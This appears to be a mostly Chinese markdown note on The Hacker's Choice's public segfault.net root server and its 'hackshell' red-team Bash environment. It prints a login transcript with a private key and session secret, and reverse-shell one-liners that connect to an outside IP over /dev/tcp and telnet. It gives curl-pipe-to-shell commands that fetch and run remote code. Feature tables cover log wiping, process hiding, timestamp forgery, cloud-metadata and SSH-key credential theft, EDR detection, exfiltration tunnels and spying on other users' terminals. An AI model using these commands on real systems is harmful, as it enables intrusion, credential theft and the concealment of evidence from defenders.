# The Hacker's Choice

> ## Who we are and what we do
>
> We are a group of international hackers.
>
> We do IT security work. We are not for hire. All of our work is for the public.
>
> We research and publish tools and academic papers to expose fishy IT security that just isn’t secure. We also develop and publish tools to help the IT Security movement.

## 公益跳板机（研究、学术性质）

`ssh root@segfault.net`，密码 `segfault`

```bash
$ ssh root@segfault.net
🦋 This is a Free SERVICE for researchers, developers and unix enthusiasts 👍
root@segfault.net's password: 
######################################################################
#### DISCLAIMER: TO BE USED FOR CREATIVE AND GOOD PURPOSES ONLY.. ####
#### TO TINKER AND TO EXPLORE.     >>>USE AT YOUR OWN RISK<<<     ####
######################################################################
----------------------------------------------------------------------
You are using the FREE TIER without a TOKEN. Various restrictions
apply:

- You have to wait 30 seconds ❤
- Your network traffic is metered and at snail speed 🙈
- Your CPU power and memory are limited 🙉
- Your server is subject to automated ban 🙊
- Your server will shut down on log out 💩

Read 👉 https://thc.org/sf/token 👈 to remove these restrictions. ❤

After login, see your restrictions by typing: cat /config/self/limits
----------------------------------------------------------------------
Read https://thc.org/sf/faq as well. 📖
----------------------------------------------------------------------


Press any key to continue (you have 10 seconds).

Creating Server TargetIce.........................................[OK]
:Cut & Paste these lines to your workstation's shell to retain access:
######################################################################
cat >~/.ssh/id_sf-lsd-segfault-net <<'__EOF__'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB3jmp/3JyvY9ABgjrx4+sBnQ0T+yHsB4HTBMcJqC2OtgAAAIiJ9mzOifZs
zgAAAAtzc2gtZWQyNTUxOQAAACB3jmp/3JyvY9ABgjrx4+sBnQ0T+yHsB4HTBMcJqC2Otg
AAAEAs6YNqZSzAfZDl5/vDOB0vv7EZMxMUc/fEipuZ9A3eCHeOan/cnK9j0AGCOvHj6wGd
DRP7IewHgdMExwmoLY62AAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
__EOF__
cat >>~/.ssh/config <<'__EOF__'
host targetice
    User root
    HostName lsd.segfault.net
    IdentityFile ~/.ssh/id_sf-lsd-segfault-net
    SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ
    LocalForward 5900 0:5900
__EOF__
chmod 600 ~/.ssh/config ~/.ssh/id_sf-lsd-segfault-net
######################################################################
Thereafter use these commands:
--> ssh  targetice
--> sftp targetice
--> scp  targetice:stuff.tar.gz ~/
--> sshfs -o reconnect targetice:/sec ~/sec 
----------------------------------------------------------------------
Token             : No See https://thc.org/segfault/token
Your workstation  : *.*.*.*     (Hong Kong/Hong Kong)
Reverse Port      : Type curl sf/port for reverse port.
Exit cryptostorm  : 207.244.108.40  (Washington DC)
Exit mullvad      : 154.47.16.59    (Bogota/Colombia)
TOR Proxy         : 172.20.0.111:9050
Shared storage    : /everyone/TargetIce        (encrypted)
Your storage      : /sec                       (encrypted)
Your Onion WWW    : /onion                     (encrypted)
Your Web Page     : http://ftk4x6klwl5uwkgk75smxlod5hvxy4ayjct42vicubivznxjx5fyilyd.onion/targetice/
SSH               : ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@lsd.segfault.net
SSH (TOR)         : torsocks ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@pwazc2ops4uitnwgmu6pkgqtyaoou5d3an4jvbfya3xrz2k63pfqawyd.onion
SSH (gsocket)     : gsocket -s OGUyNjdhNmEM ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@lsd.segfault.gsocket
SECRET            : isWsapyEBOrHmEmHzfoRFMDJ <<<  WRITE THIS DOWN  <<<

┌──(root💀lsd-TargetIce)-[~]
└─# id
uid=0(root) gid=0(root) groups=0(root)

┌──(root💀lsd-TargetIce)-[/tmp]
└─# curl sf/port
🌎 Tip: Type cat /config/self/reverse_* for details.
🤭 Tip: Type rshell to start listening.
🛜 Tip: Type curl sf/port to assign a new port.
👾 Your reverse Port is 207.244.108.40 61759 [207.244.108.40:61759]
                                                                                                                                                         
┌──(root💀lsd-TargetIce)-[/tmp]
└─# rshell      
Use one of these commands on the remote system:
    1. bash -c '(exec bash -i &>/dev/tcp/207.244.108.40/61759 0>&1) &'
    2. U=/tmp/.$$;rm -f $U;touch $U;(tail -f $U|sh 2>&1|telnet 207.244.108.40 61759 >$U 2>&1 &)
Once connected, cut & paste the following into the _this_ shell:
-------------------------------------------------------------------------------
 "$SHELL" -c true || SHELL=$(command -v bash) || SHELL=/bin/sh
 xc="import pty; pty.spawn('${SHELL:-sh}')"
 python -c 'import pty;' 2>/dev/null && python -c "$xc" \
    || { python3 -c 'import pty;' 2>/dev/null && python3 -c "$xc"; } \
    || { command -v script >/dev/null && script -qc "${SHELL:-sh}" /dev/null; }
unset HISTFILE
export SHELL=/bin/bash TERM=xterm-256color
export LESSHISTFILE=-
export REDISCLI_HISTFILE=/dev/null
export MYSQL_HISTFILE=/dev/null
alias ssh='ssh -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias scp='scp -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias wget='wget --no-hsts'
alias vi='vi -i NONE'
alias vim='vim -i NONE'
reset -I
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
stty -echo cols 200;printf "\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '{ printf "rows "$2" cols "$3; }')
-------------------------------------------------------------------------------
 eval "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
-------------------------------------------------------------------------------
To force-exit this listener, type kill "$(pgrep -P 239)" on your Root Server
Listening on 207.244.108.40:61759
listening on [any] 61759 ...

```

refer to https://github.com/hackerschoice/segfault.git

which leads to make a self-host segfault like server

## hackshell

repo: https://github.com/hackerschoice/hackshell.git

`source <(curl -SsfL https://thc.org/hs)`

一站式红队 Bash 环境，初始化完成后，后续命令都跑在内存里，退出不留痕；提供的能力如下

### 1. 隐身与反取证

| 功能 | 例子 |
|------|------|
| 禁用各类历史记录文件 | 自动 unset `HISTFILE`、`LESSHISTFILE`、`MYSQL_HISTFILE`、wget/redis/mysql 的 history |
| 隐藏进程 | `hide <PID>` — 用 mount bind 把 `/proc/<PID>` 遮住，进程从 ps 里消失 |
| 隐藏命令行参数 | `zapme` — 用 zapper 替换当前 shell，所有参数变成 `[kthreadd]` 之类 |
| 文件时间戳伪造 | `notime . rm -f foo` — 执行命令但不改变文件 atime/mtime/ctime |
| 清理 SSH 日志 | `sshd_clean` / `clean` — 从 auth.log/daemon.log/syslog 中删除当前会话的 sshd 记录 |
| 清理登录痕迹 | `lastlog_clean`、`utmp_clean`、`wtmp_trim`、`btmp_trim` |
| 加密文件（内存中） | `enc secret.txt` → `dec secret.txt`（基于 openssl，密钥自动从 machine-id 派生） |
| 反自毁 | `xkeep` 禁止退出时清空 XHOME |

### 2. 环境侦察与自动挖凭据 (Loot)

| 功能 | 例子 |
|------|------|
| SSH 私钥扫描 | 自动扫 `/home/*/.ssh/` 下的未加密私钥，检测是否有密码保护 |
| SSH Agent 劫持 | 发现 `/tmp/ssh-*` agent socket，直接 `ssh-add -l` 列出可用的 key |
| SSH 会话劫持 | `lootlight` — 列出活跃的 ssh 进程，提示可以用 `reptyr` 抢过来 |
| 各类 CMS 数据库凭据 | 自动匹配 WordPress (`wp-config.php`)、GitLab (`database.yml`)、Bitrix (`.settings.php`) 的 DB 密码 |
| 云平台元数据窃取 | `_loot_aws` — 从 `169.254.169.254` 偷 AWS IAM 临时凭据；同样支持 OpenStack、Yandex Cloud |
| Bash 历史命令审计 | `lootmore` — 从 `.bash_history` / `.zsh_history` 提取 ssh、scp、git、rsync、gs-netcat 等命令 |
| 最近登录记录 | `lootmore` 显示 `lastlog`、`dmesg` 尾部、apache vhost 等 |
| NoseyParker 扫描 | `np` — 用 noseyparker 扫描目录里的 secret/key/凭据 |

### 3. EDR/AV/安全产品检测

| 功能 | 例子 |
|------|------|
| 检测 70+ 种 EDR/AV | `_warn_edr` — 开机自动扫描，覆盖 CrowdStrike、SentinelOne、CarbonBlack、Kaspersky、Sophos、TrendMicro、Wiz 等 |
| 检测安全模块 | 自动检测 **SELinux** 是否启用 (`getenforce`)、**AppArmor** (`aa-status`)、内核 GrSec/PaX |
| 检测远程日志 | 检查 rsyslog 是否转发到远端 (`@@` 语法) |
| 检测非标内核模块 | `_warn_lkm` — 读 `/proc/sys/kernel/tainted`，列出非 in-tree 的内核模块 |
| 检测无文件进程 | `_warn_rk_exe` — 发现 exe 被 delete 或在 memfd 上的可疑进程 |
| 检测 eBPF | `ebpf_show` — 列出系统中所有 BPF 程序和挂载的 BPF 文件系统 |
| 检测 Ebury 后门 | `_warn_ebury` — 检测著名的 Ebury SSH 后门 |
| 检测 XMR 矿工 | `_warn_skids` — 扫 XMRig 进程、可疑 cron 和 systemd 服务 |
| UPX 壳进程检测 | 自动扫 `/proc/*/exe` 里所有 UPX 打包的进程 |

### 4. 网络与端口操作

| 功能 | 例子 |
|------|------|
| 端口转发 (root) | `bounce 2222 10.0.0.1 22` — 把入站 2222 端口的流量 DNAT 到内网 10.0.0.1:22 |
| 端口转发 (非 root) | `bounceperl 8080 10.0.0.1 80` — 纯 Perl 实现的用户态端口转发 |
| 限制 bounce 来源 IP | `bounceinit 1.2.3.4/24 5.6.7.8/16` |
| Ghost IP (WireGuard 隐身) | `ghostdev wg0 10.99.99.1 eth0` / `unghostdev` — 给 WireGuard 出站流量换一个不存在于任何接口上的幽灵 IP |
| TCP 端口扫描 | `scan 22,80,443 192.168.0.1` / `scan - 192.168.0.1-254` |
| DNS 解析 | `dns example.com` → IP；`resolv` — 批量 stdin → IP |
| 子域名发现 | `find_subdomains .com` — 从文件或 stdin 中提取子域名 |
| crt.sh 子域枚举 | `sub example.com` — 查 crt.sh + THC 的反查 |
| PTR 反查 | `ptr 1.2.3.4` / `rdns 1.2.3.4` |
| IP 信息 | `ipinfo` — 通过 curl/wget 绕过 DNS 查询 ipinfo.io |

### 5. 文件传输与渗透通道

| 功能 | 例子 |
|------|------|
| 上传文件 | `transfer payload.tar.gz` → bashupload.com |
| 快速粘贴 | `tb script.sh` → termbin.com |
| gs-netcat 渗透隧道 | `gsnc` — 全局加密隧道；`gs-exfil-server`/`gs-exfil` — 通过隧道传文件 |
| gs-netcat SFTP | `gs-sftp-server` / `gs-sftp` — 通过 Gsocket 隧道搭 SFTP |
| 多协议下载 | `dl`、`purl`(python)、`surl`(openssl s_client)、`lurl`(perl LWP)、`burl`(bash /dev/tcp) |

### 6. 工具二进制静默部署 (`bin`)

| 功能 | 例子 |
|------|------|
| 下载全套工具 | `bin` — 下载 nmap、socat、ncat、strace、tcpdump、ripgrep、vim、busybox、curl、jq、gzip、rsync 等 20+ 个静态编译工具 |
| 下载单个工具 | `bin nmap` |
| 包管理器模式 | `dbin search nmap` / `dbin install nmap` / `dbin list` |
| soar 包管理 | `soar dl nmap` — 从 pkgforge 拉预编译二进制 |
| 落地位置 | 全部存到 `/dev/shm/.<tab>~?$:?` (XHOME)，退出自毁 |

### 7. Shell 增强

| 功能 | 例子 |
|------|------|
| 升级为 PTY | 反向 shell 里自动检测并升级为交互式 PTY |
| xssh | `xssh user@host` — SSH 过去后自动在远端升级为 PTY、设好 TERM、清除历史文件 |
| SSH 复用 | 自动启 `ControlMaster`，复用同一个 SSH 连接，不走 Shell 历史 |
| tmux 隐藏 | `xtmux` — tmux socket 放 `/tmp/.tmux-<UID>`，不用默认路径 |
| 切换用户 | `xsu www-data` — 用 Python 做 setuid/setgid 切换到任意用户 |
| 代理设置 | `proxy 127.0.0.1:1080` / `unproxy` |
| 内存执行 | `cat /usr/bin/id | memexec -u` / `memexec https://thc.org/my-backdoor` — 无文件执行 |
| 偷窥他人终端 | `tit read <PID>` — strace bash 进程看别人在打什么命令 |

### 8. 杂项

| 功能 | 例子 |
|------|------|
| XOR 编解码 | `echo "secret" | xor 0xfa` |
| 文件安全擦除 | `shred file.txt` (无 shred 命令时用 /dev/urandom + rm) |
| strings 替代 | 无 binutils 时用 perl 或 grep 实现 `strings` |
| 找可写目录 | `wfind /etc /var` — 递归找可写目录 |
| 时间排序文件列表 | `ltr` (按时间)、`lssr` (按大小) |
| 已知 hosts hashcat | `ssh-known-hosts2hashcat` — 把 `known_hosts` 的 HMAC-SHA1 hash 转成 hashcat 格式 |
| 系统全量快照 | `lootmoremore` — 跑一整套命令收集系统信息 (passwd、shadow、iptables、sysctl、ss 等) |

## other

1. 公益 Telegram 代理，https://www.thc.org/t/
2. 公益邮件转发服务，`curl 'https://mail.thc.org/register?name=foobar&to=hackbart@tuta.io'`

## refer

1. https://www.thc.org
2. https://hackmd.io/@sondt/vps-kali-linux-for-free